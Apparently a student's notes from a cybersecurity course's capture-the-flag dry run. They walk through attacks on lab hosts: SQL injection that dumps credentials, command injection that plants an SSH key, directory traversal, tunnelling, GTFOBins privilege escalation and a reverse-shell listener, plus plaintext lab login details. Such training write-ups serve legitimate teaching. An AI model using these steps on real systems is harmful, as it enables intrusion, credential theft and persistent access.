## CCTC Security Day 11
- agenda

## Admin Data 

### CTFd info FOR UPDATED CTF
| Field | Value | 
|-|-|
| Stack # | 10 | 
| Username | JAMO-005-B |  
| Password | YdY8vrRGOsRfhy6 |
| lin.internet | 10.50.21.133 |
|Linux ops | 192.168.65.20, 10.50.27.132|
| Windos Ops | 1192.168.65.10, 10.50.26.107|

## DryRun
```
ignore 10.10.x.x, 192.168.28.30 & 192.168.28.198
```

```
starting target ip address: 10.50.20.191
```
**Tasking**

All actions must be in accordance with mission brief, scope, and RoE.

Complete the taskings on each referenced target below.

Each heading is the hostname of a target. The first listed target’s hostname is “PublicFacingWebsite”.

***
```
******************************************
ignore ips: 10.10.x.x, 192.168.28.30 & 192.168.28.198
password decode: ROT13 or BASE64

lin-ops ip: 10.50.27.132

starting target ip (T1): 10.50.20.191
    creds: user2:EaglesIsARE78
    ports: 22(ssh), 80(http)

T2: 192.168.28.181 WebApp
    creds: don't worry about it, just need it for http

T3: 192.168.28.172 (RoundSensor?)
    creds: Aaron:apasswordyPa$$word
    ports: 22(ssh)

******************************************
```
***
**PublicFacingWebsite**

- Perform Reconnaissance 
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors.

- Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system.
- Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
- Pivot to Found Targets
    1. Pivot through network to other targets as you find them.

### ***Notes for PublicFacingWebsite***

-  Starting from T1:
	- for i in {1..254} ;do (ping -c 1 10.50.20.$i | grep "bytes from" &) ;done
	- sudo nmap -sS -Pn 10.50.20.191 -p 135-139,22,80,443,21,8080
```
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   open     ssh
80/tcp   open     http
135/tcp  filtered msrpc
136/tcp  filtered profile
137/tcp  filtered netbios-ns
138/tcp  filtered netbios-dgm
139/tcp  filtered netbios-ssn
443/tcp  filtered https
8080/tcp filtered http-proxy
```
- T1 cont:
    - wget 10.50.20.191:80 (opens up the webserver)
	- firefox, type in that ip address

	- sudo nmap -sS -Pn 10.50.20.191 --script http-enum

```
Starting Nmap 7.60 ( https://nmap.org ) at 2022-01-18 14:24 UTC
Nmap scan report for 10.50.20.191
Host is up (0.0021s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login.html: Possible admin folder
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```
- T1 cont:
    - go to website and inspect the 'employee login' page html, see that it has a login.php option 
    - do a sql injection with `http://10.50.20.191/login.php?username=tom%27%20OR%201=%271%20&%20passwd=tom%27%20OR%201=%271` (copy and pasted from our notes) and get the following info 
        -  Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER78 ) 1Array ( [0] => user3 [name] => user3 [1] => Obo4GURRnccyrf [pass] => Obo4GURRnccyrf ) 1Array ( [0] => Lee_Roth [name] => Lee_Roth [1] => anotherpassword4THEages [pass] => anotherpassword4THEages ) 1
        - user2: RntyrfVfNER78 (EaglesIsARE78)
        - user3: Bob4THEEapples
    - Sadly this doesn't exactly get us anywhere at the moment, but may be helpful later. So! Let's go back to that `nmap --script http-enum` thing and enumerate all of those website
        - login.php, we've seen before
        - login.html, we've seen before
        - img, some cool photos I guess
        - scripts, open it up!!! look below
```
#!/usr/bin/python3
  
import os

system_user=user2
user_password=EaglesIsARE78



##Developer note

#script will eventually take above system user credentials and run automated services
```
***
**BestWebApp**

- Perform Reconnaissance
    1. Find all information about, and contained within, the target system to include potential phishing targets, website directory structure, and hidden pages.
    2. Actively scan and interact with target to find potential attack vectors. 

- Attempt Exploitation
    1. Attempt to retrieve privileged information from the target by using information found in reconnaissance. Reconnaissance from other targets within the network may have information relevant to any target.
BestWebApp

### ***Start of T2 enumeration (BestWebApp Notes)***
- `ssh user2@10.50.20.191`
- cd etc
- cat hosts
```
# The following lines are desirable for IPv6 capable hosts
::1 ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
ff02::3 ip6-allhosts
192.168.28.181 WebApp
```
- ping sweep with `for i in {1..254};do (ping -c 1 192.168.28.$i | grep "bytes from" &); done`
```
64 bytes from 192.168.28.172: icmp_seq=1 ttl=63 time=1.98 ms
64 bytes from 192.168.28.181: icmp_seq=1 ttl=63 time=2.09 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.467 ms
```
- open up dynamic back on **LIN-OPS STATION** `ssh -D 9050 user2@10.50.20.191 -NT
` with the T1 creds you found
- nmap scan now for ports `proxychains sudo nmap -sS -Pn 192.168.28.181 -p 135-139,22,80,443,21,8080`
```
PORT     STATE    SERVICE
21/tcp   filtered ftp
22/tcp   filtered ssh
80/tcp   filtered http
135/tcp  filtered msrpc
136/tcp  filtered profile
137/tcp  filtered netbios-ns
138/tcp  filtered netbios-dgm
139/tcp  filtered netbios-ssn
443/tcp  filtered https
8080/tcp filtered http-proxy
```
- open up firefox settings and change back proychains by going --> network setting --> manual proxy config --> Socks host: localhost | port 9050.
- go to 192.168.28.181 pn firefox
    - it has a bunch of inventory for various electronics. Might be able to exploit? 
    - let's try to use SQL injection to see what is vulnerable
    - start by trying to find total dump of usual database : `http://192.168.28.181/pick.php?product=7%20or%201=1` so 7 is vulnerable and use or 1=1 to find it. From there we get the 3 columns needed
    - `http://192.168.28.181/pick.php?product=7%20Union%20SELECT%20table_schema,%20column_name,%20table_name%20FROM%20information_schema.columns`
    - `http://192.168.28.181/pick.php?product=7%20Union%20SELECT%20user_id,%20name,%20username%20FROM%20siteusers.users`
```
Item 	On Hand 	Price
HAM 	32 	$15
1 	Aaron 	$Aaron
2 	user2 	$user2
3 	user3 	$user3
4 	Lroth 	$Lee_Roth
1 	ncnffjbeqlCn$$jbeq 	$Aaron
2 	RntyrfVfNER78 	$user2
3 	Obo4GURRnccyrf 	$user3
4 	anotherpassword4THEages 	$Lroth
```
- aaron password translated from ROT13 --> apasswordyPa$$word
- run nmap to see open ports for ips: `proxychains nmap -Pn 192.168.28.172 -p 135-139,22,80,443,21,8080`
- see that ssh is open, try to ssh to it using Aaron@192.168.28.172 --> brings you to RoundSensor
***
**RoundSensor**

- Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.

- Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
- Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
- Pivot to Found Targets
    1. Pivot through network to other targets as you find them.

### ***Start of T3 enumeration (RoundSensor Notes)***
- etc/hosts/ --> no useful ips
- `for i in {1..254};do (ping -c 1 192.168.28.$i | grep "bytes from" &); done`
```
64 bytes from 192.168.28.172: icmp_seq=1 ttl=64 time=0.031 ms
64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=2.03 ms
64 bytes from 192.168.28.190: icmp_seq=1 ttl=64 time=0.764 ms
```
***
**Windows-Workstation**

- Perform Reconnaissance
    1. Actively scan and interact with target to find potential attack vectors.
- Attempt Exploitation || Gain Initial Access
    1. Use information gained from reconnaissance to gain access to the system. Reconnaissance from other targets within the network may have information relevant to any target.
- Find Additional Targets
    1. Perform post-exploitation tasks (situational awareness, localhost enumeration, privilege escalation, etc).
    2. Discover additional targets through analysis of information from post-exploitation tasks.
- Pivot to Found Targets
    1. Pivot through network to other targets as you find them.

NOTES
    • 

***
***
***
## Instructor notes for DryRun

2 parts: 16 part 1. 15 part 2. Need 22 questions total to pass. 

Will kno wwhat box you're on because it will say it on the host name. So any questions with Linux 1 will be on the Linux 1 box. But be aware that that same box might have questions in multiple boxes (priv esc, recon, etc)

Questions will have between 3-5+ attempts 

start of boxes

## T1:
- nmap -Pn 10.50.26.76
- nmap -Pn 10.50.26.76 --scripts http-enum
- enumerate pages based on what aboce command finds 
- look through for scripts, it shoudl pop up with the creds user2:****password
- in username area do `tom' or 1=1#`
- or use dev console `10.50.20.191/login.php?username=tom' or 1='1&passwd=tom' or 1='1`
- this gives us that list of passwords and usernames again 
- command injection and directory traversal (**CHECK BOTH**)
    - directory traversal: `../../../../../../../../etc/passwd` this will give us username, home directory, and default shell
    - cmd injection: `;whoami` --> ssh key upload if this works
        - `;ls/var/www/html -la` to see if there are any other pages and enumerate the website
## BESTWEBAPP TRAVERSAL
- now actually get on box with `ssh user2@10.50.25.76 -D 9050` (through dynamic just incase it's needed)
- enumerate other networks: `cat /etc/hosts` gives us a new ip address 192.168.28.1181 WebApp
- scan that network with `for i in {1..255};do (ping -c 1 192.168.28.$i | grep "bytes from"&);done`
- check root web directory `ls -la /var/www/html/` to ensure website is fully enumerated
- no need to priv esc
- logging tho --> 
    - `ps -elf | grep rsyslog` --> `cat /etc/rsyslog.conf` or `cat /etc/ryslog.d/`
    - `cat /etc/crontab`
    - `cd /home`
- go back to scnnaing IP addresses
    - `proxyhcains nmap -Pn  192.168.28.181`
        - web and 22
            - `proxyhcains nmap -Pn  192.168.28.181 --scripts http-enum` because it has web
    - `proxyhcains nmap -Pn  192.168.28.172`
        - just ssh (22)
    - # ssh user2@ip -L 1111:NEED TO FIX from instructor
- firefox to 192.168.28.181 
- see that it has a table, so SQL Injection
    - seince dealing with numner `pick.php?product=6 or 1=1` but try other numbers in product to see what works. It works for 7 tho so `pick.php?product=7 or 1=1` so it's vulnerable to SQL injection
    - now you need to find the columns needed for union select
        - `product=7 UNION 1,2,3` --> this works, if you do 3,4 or 1,2 it throughs an error sayin gthings don't exsist, so need the right number of columns, which is 3. This tells us how it is formatted vs how it is viewed to you 
        - `product=7 UNION SELECT table_schema, column_name, table_name, FROM information_schema.columns`
        - now that you know all the data bases, we care about the siteuser database so `product=7 UNION SELECT user_id,name,username FROM siteuser.users` (columns from database_name.table_name). This should give use a few more usernames and databases 
            - most importantly is lee roth and Aaron

## NOW ON SENSORROUND
- now built new tunnel: `ssh user2@10.50.25.76 1111:192.168.28.172:22`
- get onto Aaron: `ssh Aaron@localhost -p 1111 -D 9050`
- now get bash shell `bash`
- see who Aaron can talk to: `cat /etc/hosts`
- see ip address ports `for i in {1..255};do (ping -c 1 192.168.28.$i | grep "bytes from"&);done`
- see home: `cd /home ls -la`
- ***SEE IF YOU CAN ESCALATE***: `sudo -l` --> gtfobins --> find --> sudo --> read what it does and copy and paste into it to see if you can get root --> type bash again to get a a bash shell
- ***NOW YOURE ROOT!*** (this is as hard as it should be on the test)
- if you don't hae sudo: `find / -type f -perm /4000 -ls 2>/dev/null`, copy and paste into a word document and try them all in GTFO bins and see what you can do. 
- now go into root --> `cd root`, `ls -la `--> `chmod +x` any executable you find of interest, try and take any files or cool things you see and cat them
- ***REMEMBER RSYSLOG*** --> key files, what it does, etc etc 

- proxychains nc 192.168.28.179 9999
- run windows buffer overflow which runns reverse shell
- nc -lvnp 4444 --> get's you on box

### WINDOWS MACHINE
- ssh Aaron@loclahost -p 1111 -L 2222:<#ip>:3389 (windows rdp connection)
- now on windows box (with gui): check out file directory, view --> click hidden items and file name extension 
- now go to this pc --> user files --> dfault folders, etc, users, (***light folder means hidden***) now check lroth, documents, etc, just general enumeration
- go to run and runonce in regedits for persistence --> HKCU and HKLM --> this could show some additional commands of interest to us 
- go to services --> properties --> description --> look for blank things --> right click --> etc etc 
- if you are required to replace an exevutable, it will be shown to you and etc etc 
    - if not, you will have to do DLL hijack and use same steps as in challenges
- scheduled tasks
    - can get a little wonky. can only see them for your current user 

### THINGS THAT WEREN'T ON DRY RUN
 - robots.txt for http-enum. be sure to go to all those places even if they say disallow. Just check it all out
 - cmdinjection
    - http://10.50.28.52/cmdinjection/
    - ;whoami --> www-data 
    - ;ls -la /var/www/html 
- ssh key 
    - `;whoami`
    - find user, then find their home directory --> `;cat /etc/passwd` -> www-data:x:33:33:www-data:/var/www:/bin/bash
    - now you need to know if that home directory contais ssh `;ls -la /var/www`
    - make a .ssh directory  `mkdir /var/www/.ssh` 
    - make an ssh key (rsa_id.pub etc etc) --> in your personal home directory `ssh-keygen -t rsa` then click enter a ton of times till back to normal comand prompt
    - want to upload teh ***PUBLIC** key not your private key.
        - `cat id_rsa.pub` then copy just the text
        - `;echo "<paste key here>" >> /var/www/.ssh/authorized_keys`
    - back on home directory `ssh www-date@10.50.28.52`, if everythign works, you should get in without a password
    - do web enumeration again `ls -la /var/www/html`

- tunnels
    - the box you authenticate to, that ishte box that can talk to the distant box
    - ssh www-data@<#ip> -L 1111:<#ip192.68.28.100>:22

- exploit dev (save for last)
    - gdb func
    pdisas main = green is good red is potentially exploitable 
    - he student guide, slide, and notes will be our best bet for the test 